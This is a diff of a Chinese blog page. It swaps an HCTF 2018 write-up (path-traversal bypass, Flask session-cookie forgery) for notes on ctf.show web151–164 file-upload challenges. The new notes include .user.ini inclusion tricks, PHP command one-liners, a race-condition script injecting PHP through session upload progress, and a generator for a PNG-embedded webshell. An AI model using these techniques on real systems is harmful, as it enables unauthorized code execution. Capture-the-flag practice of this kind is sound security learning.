@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF-HCTF做题笔记, Chenluo">
+    <meta name="keywords" content="Chenluo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BUUCTF-HCTF做题笔记 | Chenluo</title>
+    <title>Chenluo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF-HCTF做题笔记</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -443,13 +443,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/BUUCTF/">
-                                <span class="chip bg-color">BUUCTF</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -461,7 +457,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-20
+                    2021-07-18
                 </div>
                 
 
@@ -470,7 +466,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    571
+                    994
                 </div>
                 
 
@@ -490,63 +486,266 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="1-进入界面是一个图像，首先看一下源代码"><a href="#1-进入界面是一个图像，首先看一下源代码" class="headerlink" title="1. 进入界面是一个图像，首先看一下源代码:"></a>1. 进入界面是一个图像，首先看一下源代码:</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2sd4fn8rj60mg05wgmh02.jpg" alt="image-20210601151405206"></p>
-<p>在这知道，我们传入的参数给了<code>file</code>那么接下来看一下<code>checkFile</code>这个函数</p>
-<h3 id="2-查看checkFile函数"><a href="#2-查看checkFile函数" class="headerlink" title="2. 查看checkFile函数:"></a>2. 查看checkFile函数:</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2sflzzn3j30of052aat.jpg" alt="image-20210601151631374"></p>
-<ul>
-<li>首先 给出了白名单，并且判断形式参数(<code>file</code>)是不是字符串;</li>
+                <h2 id="Web151"><a href="#Web151" class="headerlink" title="Web151"></a>Web151</h2><ul>
+<li>只允许上传png的图片，上传之后bp转包改一下内容就好</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2sgsv1pkj30e802haa6.jpg" alt="image-20210601151740130"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskt5htc7fj30tx07wta8.jpg" alt="image-20210718084153252"></p>
 <ul>
-<li>判断是不是形式参数(<code>file</code>)的内容在不在白名单数组里</li>
+<li>访问1.php</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2skcn4b6j30ba04mdg6.jpg" alt="image-20210601152104780"></p>
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><strong>在响应包中查看服务器的类型</strong></p>
 <ul>
-<li>这次判断形式参数从一开始到第一个<code>?</code>出现的位置里所包含的字符串,判断这个字符串在不在白名单列表，</li>
+<li>服务器特性</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2ssgm34mj30el072js2.jpg" alt="image-20210601152849046"></p>
-<ul>
-<li>这个和上一个类似，不过这个是先进行了url解码，可能是防止<code>url</code>编码绕过</li>
-</ul>
-<h3 id="3-看了这么多不知到flag到底在哪，刚好还有个hint-php没看"><a href="#3-看了这么多不知到flag到底在哪，刚好还有个hint-php没看" class="headerlink" title="3. 看了这么多不知到flag到底在哪，刚好还有个hint.php没看"></a>3. 看了这么多不知到flag到底在哪，刚好还有个<code>hint.php</code>没看</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2svmfu6rj30kk0400td.jpg" alt="image-20210601153154020"></p>
-<p>所以估计是让我们访问<code> ffffllllaaaagggg</code></p>
-<p>那么，没有其他特殊的过滤，直接访问即可</p>
-<pre class="line-numbers language-url" data-language="url"><code class="language-url">?file&#x3D;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-p" data-language="p"><div class="caption"><span>h</span></div><code class="language-p">ngnix服务器中有一个.user.ini文件
+作用:
+auto_prepend_file : 让每一个文件在使用的时候都包含他所指定的文件，并按使用文件的类型解析
 
-<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="1-先注册登录进去，之后啥也没有，看下源代码"><a href="#1-先注册登录进去，之后啥也没有，看下源代码" class="headerlink" title="1. 先注册登录进去，之后啥也没有，看下源代码"></a>1. 先注册登录进去，之后啥也没有，看下源代码</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2tnlhmggj30jr0c0dhi.jpg" alt="image-20210601155847302"></p>
-<p>这里要求我们是<code>admin</code>登陆，要么是拿到<code>admin</code>密码，要么是利用<code>admin</code>登陆<code>cookie</code>完成登陆</p>
-<h3 id="2-继续查看其他地方的源代码"><a href="#2-继续查看其他地方的源代码" class="headerlink" title="2. 继续查看其他地方的源代码"></a>2. 继续查看其他地方的源代码</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2tq27m7aj30hl053dgx.jpg" alt="image-20210601160109761"></p>
+比如：auto_prepend_file&#x3D;1.jpg 当我们在使用index.php的时候就会自动在文件内容前面包含1.jpg，并且把1.jpg当作php文件解析
+
+auto_append_file: 和上面同理，只不过是在文件内容的最后包含<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>注意:</strong></p>
+<p><strong>上述情况在同一目录适用</strong></p>
 <ul>
-<li>在更换密码界面找到了这个，那么先访问一下，下载源码,看到<code>flask</code>，可能存在模板注入(发现不是)</li>
+<li>上传<code>.user.ini</code>文件</li>
 </ul>
-<h3 id="查看下载文件，找出有用信息"><a href="#查看下载文件，找出有用信息" class="headerlink" title="查看下载文件，找出有用信息"></a>查看下载文件，找出有用信息</h3><ul>
-<li><code>routes.py</code>在这里查看各个界面对信息的处理方法</li>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskulapu3yj60v708kab602.jpg" alt="image-20210718093139387"></p>
+<ul>
+<li>上传<code>1.jpg</code></li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2u1qh6scj30pj0c2wgc.jpg" alt="image-20210601161222648"></p>
-<p>在这里发现，每次登陆都会把用户名写进<code>session</code></p>
-<p>猜想，可以利用<code>admin</code>的<code>session</code>来登陆<code>admin</code>,并且不同用户的<code>session</code>可能只有用户名不一样</p>
-<h3 id="查看本地session"><a href="#查看本地session" class="headerlink" title="查看本地session"></a>查看本地session</h3><pre class="line-numbers language-session" data-language="session"><code class="language-session">.eJw9kEGLwjAQhf_KkrOHdrq9CB5cUoOFSemSWDIXcWvdJm1ctiraiP99iwseHsPjweN7c2fbw9CcWjY_D5dmxrZ2z-Z39vbF5sw4HSOYYJS5Sa_fpdrbosJgAlkSuZd-4xF0igHjQugIQ9-hmhysk6IyAZ0Oxn1acpgYwFR6clStAUE6A3qUwtzQdTHxZTR5MEq6QmXT_bDyKZ1SterIZanxmKAqbxjalhS10ue95CWgq6EQ5YI9Zqw-DYft-adrjq8JxPOeRDmSq0fi2YRaAwq8Sr6ZECYo3kUIK4tVCZLvexTZSMvFs8763XfzakKe_-rrf3Lc-SlgMSRsxi6nZnh-jcURe_wBqEFqGg.YLXpDg.XQzyIRpa2VGfzAoYhWaH_Cvgnrs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskunsq7s0j30sp07w75h.jpg" alt="image-20210718093405305"></p>
+<p>最好在1.jpg中包含一句<code>phpinfo()</code>,检测是否包含成功</p>
+<ul>
+<li>直接在/upload/index.php执行一句话</li>
+</ul>
+<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><ul>
+<li>继续包含</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskv5iu9jgj30p7060q3p.jpg" alt="image-20210718095103564"></p>
+<ul>
+<li>继续上传</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskv8dkc7ij30r408hjsi.jpg" alt="image-20210718095350490"></p>
+<ul>
+<li>继续执行</li>
+</ul>
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><ul>
+<li><p>继续上传文件包含</p>
+</li>
+<li><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskvixykrsj30qd076aax.jpg" alt="image-20210718100400731"></p>
+</li>
+<li><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskvm2bs9dj30qo092q41.jpg" alt="image-20210718100700040"></p>
+</li>
+<li><p>执行</p>
+</li>
+</ul>
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><ul>
+<li>过滤了<code>[]</code>用<code>&#123;&#125;</code>代替</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskvxednsfj30q5062wfe.jpg" alt="image-20210718101754468"></p>
+<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskwlryrhpj30pu06g0ts.jpg" alt="image-20210718104118611"></p>
+<ul>
+<li>过滤了<code>;</code>和<code>&#123;</code></li>
+</ul>
+<p>直接在文件中放入读取flag.php的函数</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>flag<span class="token operator">.</span>php<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><ul>
+<li>继续绕过</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskwvuatx5j30os06lgmj.jpg" alt="image-20210718105059304"></p>
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><ul>
+<li>过滤了<code>[</code>和<code>(</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskx82nr1qj30h006ejro.jpg" alt="image-20210718110245579"></p>
+<ul>
+<li>用反引号代替shell执行</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskxgj00qtj30qt05kt9h.jpg" alt="image-20210718111054045"></p>
+<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskxrm1aymj30nc0gxdhn.jpg" alt="image-20210718112132489"></p>
+<ul>
+<li>过滤了“空格”，“log”,”()”等,选用日志文件包含的形式</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsky600wzsj30rj095myr.jpg" alt="image-20210718113520018"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsky91ypr4j610k05ztbz02.jpg" alt="image-20210718113817022"></p>
+<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><ul>
+<li>过滤较多 </li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gskylkck16j30nc0gxwga.jpg" alt="image-20210718115019470"></p>
+<ul>
+<li>同上</li>
+</ul>
+<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><ul>
+<li>session文件包含</li>
+</ul>
+<ol>
+<li>先上传<code>.user.ini</code></li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">auto_prepend_file<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>sess_test <span class="token comment">//test要记住</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>跑脚本</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> io
+<span class="token keyword">import</span> threading
+ssessID <span class="token operator">=</span> <span class="token string">'test'</span> <span class="token operator">//</span>之前的test
+url <span class="token operator">=</span> <span class="token string">"http://175fce94-5d4d-4e2f-b297-1f15d7e1d3aa.challenge.ctf.show:8080/"</span>
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">256</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span>
+        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
+            url<span class="token punctuation">,</span>
+            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>ssessID<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php system("nl ../*.php");?>'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token operator">//</span>要执行的命令
+            files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+        <span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'upload/index.php'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ssessID<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'ctfshow&#123;'</span> <span class="token keyword">or</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*]retring.........'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><ul>
+<li>png图片二次渲染</li>
+</ul>
+<p><strong>png图片分为几个数据块，不同数据块的检测程度不同，主要数据块:IHDR,IDAT, IEND辅助数据块:PLTE</strong></p>
+<p>第一种目的: 找到PLTE的冗余数据，修改为php代码，就可以构造png图片马</p>
+<p>第二种目的：IDAT中放着png图片的主要信息</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token punctuation">.</span> 计算CRC<span class="token punctuation">(</span>冗余数据<span class="token punctuation">)</span>的脚本
+<span class="token keyword">import</span> binascii
+<span class="token keyword">import</span> re
+
+png <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'2.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
+a <span class="token operator">=</span> png<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+png<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+hexstr <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">''' PLTE crc '''</span>
+data <span class="token operator">=</span>  <span class="token string">'504c5445'</span><span class="token operator">+</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'504c5445(.*?)49444154'</span><span class="token punctuation">,</span>hexstr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span>
+
+<span class="token operator">//</span>最后修改CRC的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>写入IDTA数据块</li>
+</ol>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
+           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
+           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
+           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
+           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
+           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
+           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
+           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+
+<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
-<li>显示是密文，那么我们需要解密，解密需要的密钥，可以在<code>config.py</code>中找到</li>
+<li><p>直接生成含有<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>的png图片马</p>
+</li>
+<li><p>上传图片马</p>
+</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2u8ysc7uj30iz04ogm5.jpg" alt="image-20210601161920023"></p>
-<p>这里利用<code>flask-session-cookie-manager</code>这个工具解密</p>
-<p>用法:</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2ub0bbrdj30fq04ft95.jpg" alt="image-20210601162117904"></p>
-<p>进行解密:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">flask<span class="token operator">-</span>session<span class="token operator">-</span>cookie<span class="token operator">-</span>manager <span class="token operator">%</span> python3 flask_session_cookie_manager3<span class="token punctuation">.</span>py decode <span class="token operator">-</span>s <span class="token string">'ckj123'</span> <span class="token operator">-</span>c <span class="token punctuation">.</span>eJw9kEGLwjAQhf_KkrOHdrq9CB5cUoOFSemSWDIXcWvdJm1ctiraiP99iwseHsPjweN7c2fbw9CcWjY_D5dmxrZ2z<span class="token operator">-</span>Z39vbF5sw4HSOYYJS5Sa_fpdrbosJgAlkSuZd<span class="token operator">-</span>4xF0igHjQugIQ9<span class="token operator">-</span>hmhysk6IyAZ0Oxn1acpgYwFR6clStAUE6A3qUwtzQdTHxZTR5MEq6QmXT_bDyKZ1SterIZanxmKAqbxjalhS10ue95CWgq6EQ5YI9Zqw<span class="token operator">-</span>DYft<span class="token operator">-</span>adrjq8JxPOeRDmSq0fi2YRaAwq8Sr6ZECYo3kUIK4tVCZLvexTZSMvFs8763XfzakKe_<span class="token operator">-</span>rrf3Lc<span class="token operator">-</span>SlgMSRsxi6nZnh<span class="token operator">-</span>jcURe_wBqEFqGg<span class="token punctuation">.</span>YLXpDg<span class="token punctuation">.</span>XQzyIRpa2VGfzAoYhWaH_Cvgnrs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2ud1cd9fj30ya02ddgs.jpg" alt="image-20210601162313392"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsle71nkajj30y60gx413.jpg" alt="image-20210718204953551"></p>
+<p>有了文件马却找不到执行方式，<code>.user.ini</code>不再允许上传</p>
 <ul>
-<li>修改session进行加密:</li>
+<li>扫目录，看一下有没有其他的文件，或者点击查看图片，观察url</li>
 </ul>
